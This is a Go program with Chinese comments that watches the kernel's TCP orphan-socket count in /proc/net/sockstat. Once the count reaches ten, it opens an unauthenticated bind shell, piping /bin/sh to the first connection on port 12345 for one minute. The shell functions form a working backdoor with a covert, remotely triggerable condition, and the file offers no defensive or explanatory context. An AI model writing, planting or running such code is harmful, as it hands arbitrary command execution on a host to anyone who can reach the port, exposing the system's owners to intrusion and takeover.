package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// 检查/proc/net/sockstat获取orphan值
func checkOrphan() int {
	file, err := os.Open("/proc/net/sockstat")
	if err != nil {
		log.Fatal("打开文件出错: ", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "TCP:") {
			// 解析TCP行以找到orphan值
			parts := strings.Fields(line)
			for i, part := range parts {
				if part == "orphan" && i+1 < len(parts) {
					orphan, err := strconv.Atoi(parts[i+1])
					if err != nil {
						log.Fatal("解析orphan值出错: ", err)
					}
					return orphan
				}
			}
		}
	}
	if err := scanner.Err(); err != nil {
		log.Fatal("扫描文件出错: ", err)
	}
	return 0
}

// 开启端口上的shell并运行1分钟
func startShell() {
	listener, err := net.Listen("tcp", ":12345")
	if err != nil {
		log.Fatal("监听端口12345出错: ", err)
	}
	defer listener.Close()

	fmt.Println("Shell在端口12345上监听")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("接受连接出错: ", err)
			continue
		}
		go handleConnection(conn)
		break // 接受一次连接后退出循环
	}
}

// 处理每个连接
func handleConnection(conn net.Conn) {
	defer conn.Close()
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err := cmd.Start(); err != nil {
		log.Println("启动shell失败: ", err)
		return
	}
	// 等待1分钟后结束shell进程
	time.Sleep(1 * time.Minute)
	cmd.Process.Kill()
}

func main() {
	go func() {
		for {
			orphan := checkOrphan()
			fmt.Printf("检查到orphan值: %d\n", orphan)
			if orphan >= 10 {
				startShell()
			}
			time.Sleep(5 * time.Second)
		}
	}()

	// 阻止程序退出
	select {}
}
